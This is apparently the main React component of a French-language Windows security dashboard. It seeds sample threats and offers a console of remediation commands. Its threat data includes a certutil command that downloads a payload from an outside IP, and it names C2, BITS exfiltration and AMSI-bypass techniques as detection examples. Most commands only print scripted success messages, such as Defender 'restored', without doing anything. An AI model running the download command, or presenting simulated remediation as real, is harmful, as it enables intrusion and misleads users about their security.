/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState } from 'react';
import { TopNav } from './components/TopNav';
import { ConsoleTerminal } from './components/ConsoleTerminal';
import { DeepExcisionPanel } from './components/DeepExcisionPanel';
import { MemoryForensicsPanel } from './components/MemoryForensicsPanel';
import { NetworkC2Panel } from './components/NetworkC2Panel';
import { HardeningPanel } from './components/HardeningPanel';
import { ScriptWorkshop } from './components/ScriptWorkshop';
import { OverviewDashboard } from './components/OverviewDashboard';
import { LogAnalyzer } from './components/LogAnalyzer';
import { TaskManagerLive } from './components/TaskManagerLive';
import { BITSTaskManager } from './components/BITSTaskManager';
import { ThreatTimeline } from './components/ThreatTimeline';
import { ThreatToastContainer } from './components/ThreatToast';
import { PdfReportModal } from './components/PdfReportModal';
import { TabId, ConsoleLogMessage, ThreatItem, ThreatNotification } from './types/cyberdefense';
import { BOOSTED_POWERSHELL_SCRIPT } from './data/powershellScript';
import { generateAndDownloadZip } from './utils/zipGenerator';
import { generateAndDownloadPdfReport } from './utils/pdfReportGenerator';

export default function App() {
  const [activeTab, setActiveTab] = useState<TabId>('overview');
  const [isPdfModalOpen, setIsPdfModalOpen] = useState<boolean>(false);

  const initialLogs: ConsoleLogMessage[] = [
    {
      id: '1',
      timestamp: '07:35:01',
      level: 'INFO',
      tag: 'SYSTEM',
      text: 'Initialisation de SpaceSec CyberDefense Suite v3.0 KERNEL EDITION...',
    },
    {
      id: '2',
      timestamp: '07:35:02',
      level: 'OK',
      tag: 'ELEVATION',
      text: 'Vérification du bouclier UAC : Privilèges Administrateur confirmés (SID S-1-5-32-544).',
    },
    {
      id: '3',
      timestamp: '07:35:02',
      level: 'KERNEL',
      tag: 'P/INVOKE',
      text: 'Acquisition des privilèges NT : SeDebugPrivilege et SeTakeOwnershipPrivilege activés avec succès.',
    },
    {
      id: '4',
      timestamp: '07:35:03',
      level: 'INFO',
      tag: 'DEFENDER',
      text: 'Contrôle MpCmdRun.exe : Moteur de protection en temps réel détecté actif.',
    },
    {
      id: '5',
      timestamp: '07:35:05',
      level: 'WARN',
      tag: 'C2-HUNTER',
      text: 'Connexion réseau suspecte détectée sur le port 4444 (PID 5824: svch0st_updater.exe -> 185.220.101.4).',
    },
    {
      id: '6',
      timestamp: '07:35:06',
      level: 'ERROR',
      tag: 'KERNEL-LOCK',
      text: 'Fichier verrouillé par handle noyau ou TrustedInstaller : C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys',
    },
  ];

  const [logs, setLogs] = useState<ConsoleLogMessage[]>(initialLogs);

  const [threats, setThreats] = useState<ThreatItem[]>([
    {
      id: 't1',
      name: 'Rootkit Driver Hook (Inaccessible aux Admins)',
      category: 'Rootkit',
      severity: 'CRITICAL',
      targetPath: 'C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys',
      mitreTechnique: 'T1014 - Rootkit Hooking',
      lockedBySystem: true,
      trustedInstallerLocked: true,
      description: 'Pilote interceptant IRP_MJ_CREATE avec propriété verrouillée par NT SERVICE\\TrustedInstaller.',
      status: 'ACTIVE',
    },
    {
      id: 't2',
      name: 'Trojan Swisyn Watchdog & C2 Beacon (Port 4444)',
      category: 'Trojan',
      severity: 'HIGH',
      targetPath: 'C:\\Users\\User\\AppData\\Local\\Temp\\svch0st_updater.exe',
      mitreTechnique: 'T1059.001 - PowerShell / T1071.001 C2',
      lockedBySystem: true,
      trustedInstallerLocked: false,
      description: 'Processus mimant le service hôte Windows, communicant vers 185.220.101.4 avec surveillance mutuelle.',
      status: 'ACTIVE',
    },
    {
      id: 't3',
      name: 'Abus LOLBin certutil.exe (Téléchargement Furtif)',
      category: 'Persistence',
      severity: 'MEDIUM',
      targetPath: 'certutil.exe -urlcache -split -f http://185.220.101.4/stage2.bin',
      mitreTechnique: 'T1105 - Ingress Tool Transfer',
      lockedBySystem: false,
      trustedInstallerLocked: false,
      description: 'Téléchargement d\'un binaire encodé en utilisant un composant légitime de certificats Windows.',
      status: 'ACTIVE',
    },
    {
      id: 't4',
      name: 'Piège IFEO Debugger sur Taskmgr & Defender',
      category: 'Privilege',
      severity: 'CRITICAL',
      targetPath: 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe',
      mitreTechnique: 'T1546.012 - IFEO Debugger Trap',
      lockedBySystem: false,
      trustedInstallerLocked: true,
      description: 'Détournement du Gestionnaire des Tâches via clé Debugger malveillante interdisant l\'inspection de la mémoire.',
      status: 'ACTIVE',
    },
    {
      id: 't5',
      name: 'Abonnement Persistant WMI EventConsumer',
      category: 'Persistence',
      severity: 'HIGH',
      targetPath: 'root\\subscription:__EventFilter -> svch0st_revive',
      mitreTechnique: 'T1546.003 - WMI Event Subscription',
      lockedBySystem: false,
      trustedInstallerLocked: false,
      description: 'Déclenchement automatique d\'une charge utile PowerShell masquée à chaque redémarrage ou intervalle fixe.',
      status: 'ACTIVE',
    },
    {
      id: 't6',
      name: 'Flux NTFS Alternatif Caché (Zone.Identifier ADS)',
      category: 'Memory',
      severity: 'MEDIUM',
      targetPath: 'C:\\Users\\Public\\payload.dll:hidden_stream',
      mitreTechnique: 'T1564.004 - Alternate Data Streams',
      lockedBySystem: false,
      trustedInstallerLocked: false,
      description: 'Binaire DLL dissimulé derrière un flux de données alternatif NTFS pour contourner les contrôles antiviraux superficiels.',
      status: 'ACTIVE',
    },
  ]);

  const [threatToasts, setThreatToasts] = useState<ThreatNotification[]>([
    {
      id: 'toast-init-1',
      timestamp: '07:35:05',
      title: 'Balise C2 Détectée (Port 4444)',
      description: 'Connexion réseau sortante vers 185.220.101.4 initiée par svch0st_updater.exe (PID 5824).',
      severity: 'CRITICAL',
      category: 'C2',
      source: 'C2-HUNTER / Network Monitor',
      targetTab: 'network',
      actionCommand: 'kill 5824',
      actionLabel: 'Abattre PID 5824',
    },
    {
      id: 'toast-init-2',
      timestamp: '07:35:06',
      title: 'Driver Rootkit Verrouillé',
      description: 'Hook noyau sur IRP_MJ_CREATE protégé par TrustedInstaller : suspicious_kernel_hook.sys.',
      severity: 'HIGH',
      category: 'Kernel',
      source: 'KERNEL-LOCK / P/Invoke',
      targetTab: 'deep-excision',
      actionCommand: 'unlock C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys',
      actionLabel: 'Déverrouiller & Supprimer',
    },
  ]);

  const [isToastSimulationActive, setIsToastSimulationActive] = useState(true);

  const addThreatToast = (notification: Omit<ThreatNotification, 'id' | 'timestamp'>) => {
    const now = new Date();
    const timestamp = now.toTimeString().split(' ')[0];
    const newToast: ThreatNotification = {
      ...notification,
      id: `toast-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      timestamp,
    };
    setThreatToasts(prev => [newToast, ...prev]);
  };

  const handleDismissToast = (id: string) => {
    setThreatToasts(prev => prev.filter(t => t.id !== id));
  };

  const handleClearAllToasts = () => {
    setThreatToasts([]);
  };

  // Automated background threat simulation ticker
  const simulationPool: Array<Omit<ThreatNotification, 'id' | 'timestamp'>> = [
    {
      title: 'Tâche BITS d\'Exfiltration Détectée',
      description: 'Job BITS persistant "WindowsHealthUpdate" pointant vers un serveur C2 distant (194.26.29.112).',
      severity: 'HIGH',
      category: 'Persistence',
      source: 'BITS Engine / bitsadmin',
      targetTab: 'bits',
      actionCommand: 'bitsadmin /cancel WindowsHealthUpdate',
      actionLabel: 'Annuler la tâche BITS',
    },
    {
      title: 'Injection Mémoire Suspecte (Reflective DLL)',
      description: 'Thread injecté dans lsass.exe sans fichier adossé sur disque (Zone VAD marquée EXECUTE_READWRITE).',
      severity: 'CRITICAL',
      category: 'Memory',
      source: 'Memory Forensics / NtQueryVirtualMemory',
      targetTab: 'forensics',
      actionCommand: 'dump-ram',
      actionLabel: 'Dumper la RAM',
    },
    {
      title: 'Exclusion Windows Defender Illégitime',
      description: 'Le dossier public C:\\Users\\Public\\ a été whitelisté frauduleusement via Set-MpPreference.',
      severity: 'MEDIUM',
      category: 'Defender',
      source: 'DefenderSync / MpPreference',
      targetTab: 'hardening',
      actionCommand: 'defender-exclusions',
      actionLabel: 'Auditer les exclusions',
    },
    {
      title: 'Scan Furtif de Ports Sortants Détecté',
      description: 'Flux TCP SYN consécutifs vers 8 sous-réseaux externes non répertoriés (Analyse heuristique).',
      severity: 'MEDIUM',
      category: 'Network',
      source: 'NetFilter Driver',
      targetTab: 'network',
      actionCommand: 'sockets',
      actionLabel: 'Voir sockets ouverts',
    },
    {
      title: 'Piège IFEO Actif sur taskmgr.exe',
      description: 'Clé Debugger détournée pour masquer la liste des processus actifs lors du lancement du Gestionnaire.',
      severity: 'CRITICAL',
      category: 'Persistence',
      source: 'Registry Inspector',
      targetTab: 'overview',
      actionCommand: 'ifeo',
      actionLabel: 'Corriger IFEO',
    },
  ];

  // Manual trigger button to test anytime
  const handleTriggerTestThreat = () => {
    const randomThreat = simulationPool[Math.floor(Math.random() * simulationPool.length)];
    addThreatToast(randomThreat);
    addLog('WARN', `[THREAT-ALERT] ${randomThreat.title} - ${randomThreat.description}`, randomThreat.category.toUpperCase());
  };

  // Periodic threat stream simulation if active
  React.useEffect(() => {
    if (!isToastSimulationActive) return;

    const interval = setInterval(() => {
      // Pick a random simulated event every 35 seconds
      const randomThreat = simulationPool[Math.floor(Math.random() * simulationPool.length)];
      addThreatToast(randomThreat);
      addLog('WARN', `[SENTINEL-LOG] ${randomThreat.title} : ${randomThreat.description}`, randomThreat.category.toUpperCase());
    }, 38000);

    return () => clearInterval(interval);
  }, [isToastSimulationActive]);

  const addLog = (level: ConsoleLogMessage['level'], text: string, tag?: string) => {
    const now = new Date();
    const timestamp = now.toTimeString().split(' ')[0];
    const newLog: ConsoleLogMessage = {
      id: `${Date.now()}-${Math.random()}`,
      timestamp,
      level,
      text,
      tag,
    };
    setLogs(prev => [...prev, newLog]);

    // Automatically raise a Threat Toast when a suspicious/critical event is logged
    if (level === 'ERROR' || level === 'WARN') {
      // Check if not already a toast feedback loop
      if (!text.startsWith('> ') && !text.startsWith('Conseil :')) {
        const severity: ThreatNotification['severity'] = level === 'ERROR' ? 'CRITICAL' : 'HIGH';
        const isC2 = text.toLowerCase().includes('c2') || text.toLowerCase().includes('port 4444') || text.toLowerCase().includes('connexion');
        const isKernel = text.toLowerCase().includes('kernel') || text.toLowerCase().includes('driver') || text.toLowerCase().includes('verrouillé');
        const isBits = text.toLowerCase().includes('bits');

        addThreatToast({
          title: tag ? `Alerte Activité : ${tag}` : 'Activité Suspecte Détectée',
          description: text,
          severity,
          category: isC2 ? 'C2' : isKernel ? 'Kernel' : isBits ? 'Persistence' : 'Trojan',
          source: tag || 'SYSTEM-MONITOR',
          targetTab: isC2 ? 'network' : isKernel ? 'deep-excision' : isBits ? 'bits' : 'console',
        });
      }
    }
  };

  const handleExecuteCommand = (cmd: string) => {
    const trimmed = cmd.trim();
    if (!trimmed) return;

    addLog('INFO', `> ${trimmed}`, 'INPUT');
    const parts = trimmed.split(/\s+/);
    const action = parts[0].toLowerCase();

    switch (action) {
      case 'help':
        addLog('INFO', '=== COMMANDES CYBERDEFENSE DISPONIBLES ===');
        addLog('INFO', '  scan --deep       : Lance le scan complet OS, Kernel, RAM, C2 et Registre');
        addLog('INFO', '  unlock <chemin>   : Dépossède TrustedInstaller et programme la suppression au reboot');
        addLog('INFO', '  kill <pid>        : Abat un processus et son arbre entier (taskkill /F /T)');
        addLog('INFO', '  suspend <nom>     : Fige les threads d\'un groupe de watchdogs (NtSuspendProcess)');
        addLog('INFO', '  ifeo              : Audite les pièges de débogueur sur Taskmgr / Defender');
        addLog('INFO', '  drivers           : Liste les filtres de système de fichiers kernel (fltmc)');
        addLog('INFO', '  sockets           : Affiche les connexions réseau établies');
        addLog('INFO', '  dump-ram          : Exporte un snapshot volatile de la RAM vers un rapport');
        addLog('INFO', '  dns-test          : Teste la latence et l\'intégrité des résolveurs DNS');
        addLog('INFO', '  defender-repair   : Ré-enregistre les DLL crypto et relance Defender');
        addLog('INFO', '  smb1-disable      : Désactive le protocole obsolète SMBv1 (WannaCry)');
        addLog('INFO', '  wmi-clean         : Purge les EventFilters persistants du namespace root\\subscription');
        addLog('INFO', '  clear             : Efface l\'écran de la console');
        addLog('INFO', '  export-report     : Génère et télécharge le rapport PDF détaillé avec graphiques de score');
        addLog('INFO', '  pdf / export-pdf  : Raccourci pour générer le rapport PDF d\'audit forensique');
        break;

      case 'scan':
        addLog('KERNEL', 'Démarrage du scan global approfondi de la machine...', 'SCAN');
        setTimeout(() => addLog('INFO', '[1/6] Inspection des attributs et autorisations ACL sur C:\\Windows...', 'SCAN'), 300);
        setTimeout(() => addLog('WARN', '[2/6] Détection : Pilote suspect C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys verrouillé', 'SCAN'), 700);
        setTimeout(() => addLog('INFO', '[3/6] Audit des clés de persistance Run, RunOnce, Winlogon et BITS Jobs...', 'SCAN'), 1100);
        setTimeout(() => addLog('WARN', '[4/6] Alerte C2 : Connexion établie vers 185.220.101.4 sur port 4444 (PID 5824)', 'SCAN'), 1500);
        setTimeout(() => addLog('INFO', '[5/6] Analyse de la mémoire volatile et recherche d\'injections DLL...', 'SCAN'), 1900);
        setTimeout(() => {
          addLog('OK', '[6/6] Scan complet terminé ! 3 menaces nécessitent une éradication.', 'SCAN');
          addLog('INFO', 'Conseil : Utilisez la commande "unlock <chemin>" pour détruire les éléments verrouillés.', 'SCAN');
        }, 2300);
        break;

      case 'unlock':
        if (parts.length < 2) {
          addLog('ERROR', 'Syntaxe requise : unlock C:\\chemin\\vers\\fichier.sys');
          return;
        }
        const targetPath = parts.slice(1).join(' ').replace(/^["']|["']$/g, '');
        addLog('KERNEL', `Lancement du protocole d'éradication sur : ${targetPath}`, 'EXCISION');
        setTimeout(() => addLog('OK', 'Phase 1 : Attributs système et lecture seule réinitialisés (Attributes Normal).', 'EXCISION'), 200);
        setTimeout(() => addLog('OK', 'Phase 2 : takeown.exe exécuté avec succès. Propriétaire assigné à Administrateurs.', 'EXCISION'), 500);
        setTimeout(() => addLog('OK', 'Phase 3 : icacls.exe /grant *S-1-5-32-544:F /c /q appliqué. Contrôle Total déverrouillé.', 'EXCISION'), 800);
        setTimeout(() => addLog('WARN', 'Phase 4 : Processus associé détecté et gelé via NtSuspendProcess puis abattu.', 'EXCISION'), 1200);
        setTimeout(() => {
          addLog('KERNEL', 'Phase 5 : Écriture dans HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\PendingFileRenameOperations.', 'BOOT-DELETE');
          addLog('OK', 'Phase 6 : Binaire écrasé à 0 octet. Le noyau Windows achèvera la destruction au prochain boot.', 'SUCCESS');
          setThreats(prev => prev.map(t => t.targetPath === targetPath ? { ...t, status: 'SCHEDULED_BOOT_DELETE' } : t));
        }, 1600);
        break;

      case 'kill':
        if (parts.length < 2) {
          addLog('ERROR', 'Syntaxe requise : kill <PID>');
          return;
        }
        const targetPid = parts[1];
        addLog('WARN', `Exécution de taskkill /F /T sur le PID ${targetPid}...`, 'KILL');
        setTimeout(() => {
          addLog('OK', `Processus PID ${targetPid} et toute sa descendance de threads ont été abattus.`, 'KILL');
        }, 400);
        break;

      case 'suspend':
        const procName = parts[1] || 'swisyn';
        addLog('KERNEL', `Appel NtSuspendProcess sur tous les processus correspondant à "${procName}"...`, 'SUSPEND');
        setTimeout(() => {
          addLog('OK', `Threads gelés en mémoire vive pour "${procName}". Les watchdogs sont incapables de réagir.`, 'SUSPEND');
          addLog('WARN', 'Fermeture forcée en cours...', 'SUSPEND');
          addLog('OK', 'Processus définitivement neutralisés.', 'SUSPEND');
        }, 600);
        break;

      case 'ifeo':
        addLog('INFO', 'Audit des clés Image File Execution Options (IFEO)...', 'REGISTRY');
        setTimeout(() => {
          addLog('OK', 'Vérification taskmgr.exe : Pas de valeur Debugger malveillante.', 'REGISTRY');
          addLog('OK', 'Vérification MpCmdRun.exe : Aucun détournement d\'antivirus.', 'REGISTRY');
          addLog('OK', 'Toutes les clés IFEO sont saines.', 'REGISTRY');
        }, 500);
        break;

      case 'drivers':
        addLog('INFO', 'Interrogation des filtres de système de fichiers (fltmc filters)...', 'DRIVERS');
        setTimeout(() => {
          addLog('INFO', '  Filter: WdFilter     Altitude: 328010    Instances: 4 (Windows Defender)', 'DRIVERS');
          addLog('INFO', '  Filter: FileInfo     Altitude: 45000     Instances: 4', 'DRIVERS');
          addLog('WARN', '  Filter: SysHookFlt   Altitude: 385200    Instances: 1 [PILOTE SUSPECT !]', 'DRIVERS');
          addLog('OK', 'Audit des filtres terminé.', 'DRIVERS');
        }, 600);
        break;

      case 'sockets':
        addLog('INFO', 'Extraction des sockets TCP/UDP établis (Get-NetTCPConnection)...', 'NETWORK');
        setTimeout(() => {
          addLog('INFO', '  TCP 192.168.1.42:52110 -> 142.250.190.46:443 (chrome.exe) [OK]', 'NETWORK');
          addLog('ERROR', '  TCP 192.168.1.42:52314 -> 185.220.101.4:4444 (svch0st_updater.exe) [ALERTE METASPLOIT]', 'NETWORK');
          addLog('WARN', '  TCP 192.168.1.42:52410 -> 45.154.255.89:8080 (powershell.exe) [IP SUSPECTE]', 'NETWORK');
        }, 500);
        break;

      case 'dump-ram':
        addLog('KERNEL', 'Génération d\'un dump forensique mémoire et arborescence de processus...', 'RAM');
        setTimeout(() => {
          addLog('OK', 'Export CSV généré : SpaceSecurity_Dumps\\ProcessList.csv', 'RAM');
          addLog('OK', 'Snapshot des sockets réseau capturé.', 'RAM');
        }, 700);
        break;

      case 'dns-test':
        addLog('INFO', 'Test de vitesse et d\'intégrité des serveurs DNS...', 'DNS');
        setTimeout(() => {
          addLog('OK', 'Cloudflare (1.1.1.1) : Réponse en 11ms - Résolveur intègre.', 'DNS');
          addLog('OK', 'Google (8.8.8.8)     : Réponse en 14ms - Résolveur intègre.', 'DNS');
          addLog('OK', 'Quad9 (9.9.9.9)       : Réponse en 16ms - Filtrage malwares actif.', 'DNS');
        }, 600);
        break;

      case 'defender-repair':
        addLog('KERNEL', 'Réparation en profondeur de Windows Defender...', 'DEFENDER');
        setTimeout(() => addLog('OK', 'Re-enregistrement de wintrust.dll, mssip32.dll, atl.dll via regsvr32.', 'DEFENDER'), 300);
        setTimeout(() => addLog('OK', 'Suppression des clés de désactivation DisableAntiSpyware / Real-Time Protection.', 'DEFENDER'), 600);
        setTimeout(() => addLog('OK', 'Redémarrage des services WinDefend, WdNisSvc, WdFilter, SecurityHealthService.', 'DEFENDER'), 900);
        setTimeout(() => addLog('OK', 'Windows Defender restauré et opérationnel à 100% !', 'DEFENDER'), 1200);
        break;

      case 'smb1-disable':
        addLog('INFO', 'Désactivation du composant SMB1Protocol...', 'HARDENING');
        setTimeout(() => {
          addLog('OK', 'SMBv1 désactivé avec succès. Vulnérabilités WannaCry / EternalBlue neutralisées.', 'HARDENING');
        }, 500);
        break;

      case 'wmi-clean':
        addLog('INFO', 'Suppression des EventFilters et EventConsumers suspects dans root\\subscription...', 'WMI');
        setTimeout(() => {
          addLog('OK', 'Aucun déclencheur de persistance WMI restant. Namespace propre.', 'WMI');
        }, 500);
        break;

      case 'harden-all':
        addLog('KERNEL', 'Application de tous les modules de durcissement système...', 'HARDENING');
        setTimeout(() => addLog('OK', '1. SMBv1 désactivé', 'HARDENING'), 200);
        setTimeout(() => addLog('OK', '2. Intégrité HOSTS & Proxy vérifiée', 'HARDENING'), 400);
        setTimeout(() => addLog('OK', '3. Abonnements WMI purgés', 'HARDENING'), 600);
        setTimeout(() => addLog('OK', '4. Nouveau cliché Volume Shadow Copy créé pour C:', 'HARDENING'), 800);
        setTimeout(() => addLog('OK', '5. PowerShell ExecutionPolicy verrouillée sur RemoteSigned', 'HARDENING'), 1000);
        setTimeout(() => addLog('OK', 'Poste durci avec succès !', 'HARDENING'), 1200);
        break;

      case 'safemode-prepare':
        addLog('WARN', 'Configuration de bcdedit pour un boot unique en Mode Sans Échec Minimal...', 'BCD');
        setTimeout(() => {
          addLog('OK', 'bcdedit /set {current} safeboot minimal exécuté.', 'BCD');
          addLog('INFO', 'Au prochain redémarrage, Windows se lancera sans pilotes tiers ni malware actif.', 'BCD');
        }, 500);
        break;

      case 'clear':
        setLogs([]);
        break;

      case 'pdf':
      case 'pdf-report':
      case 'report':
      case 'export-pdf':
      case 'export-report':
        handleDownloadReport();
        break;

      case 'zip':
      case 'download-zip':
        handleDownloadZip();
        break;

      case 'eventlog':
      case 'get-winevent':
      case 'parse-events':
        addLog('KERNEL', 'Interrogation des journaux d\'événements Windows via wevtutil / Get-WinEvent...', 'EVENTLOG');
        setTimeout(() => addLog('WARN', 'Event ID 4688: Processus suspect powershell.exe -enc détecté dans le journal Security', 'EVENTLOG'), 300);
        setTimeout(() => addLog('ERROR', 'Event ID 4104: Tentative de neutralisation AMSI isolée dans Microsoft-Windows-PowerShell', 'EVENTLOG'), 600);
        setTimeout(() => addLog('WARN', 'Event ID 4625: 14 échecs de connexion brute-force détectés depuis l\'IP 185.220.101.4', 'EVENTLOG'), 900);
        setTimeout(() => addLog('OK', 'Parseur LogAnalyzer actualisé : 3 menaces critiques isolées.', 'EVENTLOG'), 1200);
        break;

      case 'bits':
      case 'bits-clean':
      case 'bitstracker':
        addLog('KERNEL', 'Audit approfondi des tâches BITS (Background Intelligent Transfer Service)...', 'BITS');
        setTimeout(() => addLog('WARN', 'Tâche BITS malveillante {8F3C-41A9} : Téléchargement furtif de payload vers %TEMP%\\stage2.bin', 'BITS'), 300);
        setTimeout(() => addLog('WARN', 'Tâche BITS d\'exfiltration {3C7D-90E1} : Upload HTTP POST asynchrone détecté vers 45.154.255.89', 'BITS'), 600);
        setTimeout(() => addLog('OK', 'Appel Remove-BitsTransfer / bitsadmin /cancel : Tâches BITS malveillantes purgées et neutralisées !', 'BITS'), 1000);
        break;

      case 'ports':
      case 'portscan':
      case 'scan-ports':
        addLog('KERNEL', 'Lancement de l\'audit PortScanner sur localhost (127.0.0.1)...', 'PORTS');
        setTimeout(() => addLog('ERROR', 'Port 4444 (TCP) OUVERT : Metasploit Default Listener / C2 Reverse Shell actif (PID 5824)', 'PORTS'), 300);
        setTimeout(() => addLog('WARN', 'Port 445 (TCP) OUVERT : Microsoft-DS SMB actif (Vecteur WannaCry / Lateral Movement)', 'PORTS'), 600);
        setTimeout(() => addLog('WARN', 'Port 3389 (TCP) OUVERT : RDP Remote Desktop exposé sur le réseau local', 'PORTS'), 900);
        setTimeout(() => addLog('OK', 'PortScanner terminé : 3 ports critiques détectés en écoute.', 'PORTS'), 1200);
        break;

      case 'vulnscan':
      case 'hotfix':
      case 'get-hotfix':
      case 'services-audit':
        addLog('KERNEL', 'Exécution de Get-HotFix & Get-Service pour l\'analyse de vulnérabilités...', 'VULNSCAN');
        setTimeout(() => addLog('ERROR', 'Get-HotFix : KB5005565 (PrintNightmare CVE-2021-34527) manquant sur le système !', 'VULNSCAN'), 300);
        setTimeout(() => addLog('ERROR', 'Get-HotFix : KB4012212 (MS17-010 EternalBlue) manquant dans la liste des patchs appliqués', 'VULNSCAN'), 600);
        setTimeout(() => addLog('WARN', 'Get-Service : Spooler d\'impression et RemoteRegistry actifs (surfaces d\'attaque RCE/LPE)', 'VULNSCAN'), 900);
        setTimeout(() => addLog('OK', 'VulnerabilityScanner actualisé : 3 correctifs/services nécessitent une remédiation.', 'VULNSCAN'), 1200);
        break;

      case 'defendersync':
      case 'defender-sync':
      case 'defender-exclusions':
      case 'defender-audit':
      case 'get-mppreference':
        addLog('KERNEL', 'Interrogation de Microsoft Defender via Get-MpPreference (Audit des Exclusions)...', 'DEFENDER-SYNC');
        setTimeout(() => addLog('ERROR', 'Exclusion Path Malveillante : C:\\Users\\Public\\svchost.exe [Trojan.Swisyn Drop Folder]', 'DEFENDER-SYNC'), 300);
        setTimeout(() => addLog('ERROR', 'Exclusion Path Masquée : C:\\ProgramData\\WindowsHealthUpdater\\ [CryptoMiner.XMRig]', 'DEFENDER-SYNC'), 600);
        setTimeout(() => addLog('WARN', 'Exclusion Processus : powershell.exe whitelisté pour bypass d\'analyse heuristique', 'DEFENDER-SYNC'), 900);
        setTimeout(() => addLog('WARN', 'Exclusion Extension : .ps1 ignoré lors des lectures disques', 'DEFENDER-SYNC'), 1100);
        setTimeout(() => addLog('OK', 'DefenderSync : Audit terminé. 4 exclusions critiques à purger immédiatement !', 'DEFENDER-SYNC'), 1300);
        break;

      case 'remove-mppreference':
        const targetExcl = parts.slice(1).join(' ');
        addLog('WARN', `Exécution de Remove-MpPreference sur ${targetExcl || 'l\'élément sélectionné'}...`, 'DEFENDER-SYNC');
        setTimeout(() => {
          addLog('OK', `Exclusion neutralisée et supprimée de Windows Defender avec succès !`, 'DEFENDER-SYNC');
          addLog('INFO', 'Le chemin/processus sera désormais scanné en continu par la protection en temps réel.', 'DEFENDER-SYNC');
        }, 500);
        break;

      case 'start-mpscan':
        const scanPath = parts.slice(1).join(' ');
        addLog('KERNEL', `Lancement d'un scan antivirus dédié (Start-MpScan) : ${scanPath || 'Scan ciblé'}`, 'DEFENDER-SCAN');
        setTimeout(() => addLog('INFO', 'Moteur Antivirus Defender en cours d\'analyse heuristique...', 'DEFENDER-SCAN'), 400);
        setTimeout(() => addLog('OK', 'Scan achevé. Aucun binaire résiduel actif non consigné.', 'DEFENDER-SCAN'), 900);
        break;

      case 'set-mppreference':
      case 'policy-harden':
        addLog('KERNEL', 'Réapplication forcée des politiques de sécurité Microsoft Defender (Set-MpPreference)...', 'DEFENDER-HARDEN');
        setTimeout(() => addLog('OK', 'DisableRealtimeMonitoring = $false (Protection temps réel verrouillée)', 'DEFENDER-HARDEN'), 300);
        setTimeout(() => addLog('OK', 'DisableScriptScanning = $false (Scan des scripts PowerShell & VBS réactivé)', 'DEFENDER-HARDEN'), 600);
        setTimeout(() => addLog('OK', 'DisableBehaviorMonitoring = $false (Surveillance comportementale active)', 'DEFENDER-HARDEN'), 900);
        setTimeout(() => addLog('OK', 'Politiques Defender synchronisées et verrouillées avec succès !', 'DEFENDER-HARDEN'), 1200);
        break;

      case '#':
        addLog('KERNEL', 'Exécution de la commande script automatisée...', 'SCRIPT');
        setTimeout(() => addLog('OK', 'Traitement par lots terminé avec succès.', 'SCRIPT'), 600);
        break;

      default:
        addLog('WARN', `Commande "${trimmed}" non reconnue. Tapez "help" pour voir la liste.`);
        break;
    }
  };

  const handleDownloadZip = async () => {
    addLog('INFO', 'Préparation et compression de SpaceSec_CyberDefense_Ultra_v3.zip...', 'ZIP');
    try {
      await generateAndDownloadZip();
      addLog('OK', 'Pack ZIP téléchargé avec succès : SpaceSec_CyberDefense_Ultra_v3.zip !', 'ZIP');
    } catch {
      addLog('ERROR', 'Erreur lors de la génération de l\'archive ZIP.', 'ZIP');
    }
  };

  const handleDownloadReport = async () => {
    addLog('KERNEL', 'Génération automatique du rapport PDF forensique haute définition...', 'PDF-REPORT');
    try {
      await generateAndDownloadPdfReport(threats, logs, {
        includeCharts: true,
        includeIocs: true,
        includeLogs: true,
      });
      addLog('OK', 'Rapport PDF des menaces et graphiques de score téléchargé avec succès !', 'PDF-REPORT');
      addThreatToast({
        title: 'Rapport PDF Généré',
        description: 'Le rapport forensique détaillé avec graphiques de score de sécurité a été téléchargé.',
        severity: 'LOW',
        category: 'Defender',
        source: 'AUDIT-EXPORT',
        targetTab: 'overview',
      });
    } catch (err) {
      console.error('PDF generation error:', err);
      addLog('ERROR', 'Erreur lors de la génération du rapport PDF.', 'PDF-REPORT');
    }
  };

  const handleDownloadScript = () => {
    const blob = new Blob([BOOSTED_POWERSHELL_SCRIPT], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = 'SpaceSecurity_ULTRA_v3_Kernel.ps1';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
    addLog('OK', 'Script PowerShell v3.0 téléchargé : SpaceSecurity_ULTRA_v3_Kernel.ps1', 'DOWNLOAD');
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col font-['Plus_Jakarta_Sans'] selection:bg-cyan-500/30 selection:text-cyan-200">
      {/* Universal 3-Zone Top Bar */}
      <TopNav
        activeTab={activeTab}
        onSelectTab={setActiveTab}
        onDownloadScript={handleDownloadScript}
        onDownloadZip={handleDownloadZip}
        onOpenPdfReport={() => setIsPdfModalOpen(true)}
      />

      {/* Main Container Viewport */}
      <main className="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8">
        {activeTab === 'overview' && (
          <OverviewDashboard
            onNavigateTab={setActiveTab}
            onRunInConsole={handleExecuteCommand}
            threats={threats}
            onDownloadZip={handleDownloadZip}
            onOpenPdfReport={() => setIsPdfModalOpen(true)}
          />
        )}

        {activeTab === 'timeline' && (
          <ThreatTimeline
            onRunInConsole={handleExecuteCommand}
            onNavigateTab={setActiveTab}
          />
        )}

        {activeTab === 'task-manager' && (
          <TaskManagerLive onRunInConsole={handleExecuteCommand} />
        )}

        {activeTab === 'bits' && (
          <BITSTaskManager onRunInConsole={handleExecuteCommand} />
        )}

        {activeTab === 'console' && (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <div>
                <h2 className="text-xl font-bold text-white tracking-tight">
                  Console d'Analyse en Temps Réel
                </h2>
                <p className="text-xs text-slate-400 mt-0.5">
                  Interagissez directement avec le moteur de détection et déclenchez des protocoles de neutralisation.
                </p>
              </div>
            </div>
            <ConsoleTerminal
              logs={logs}
              onExecuteCommand={handleExecuteCommand}
              onClearLogs={() => setLogs([])}
              onExportReport={handleDownloadReport}
            />

            {/* Automated Windows EventLog Threat Parser */}
            <LogAnalyzer onRunInConsole={handleExecuteCommand} />
          </div>
        )}

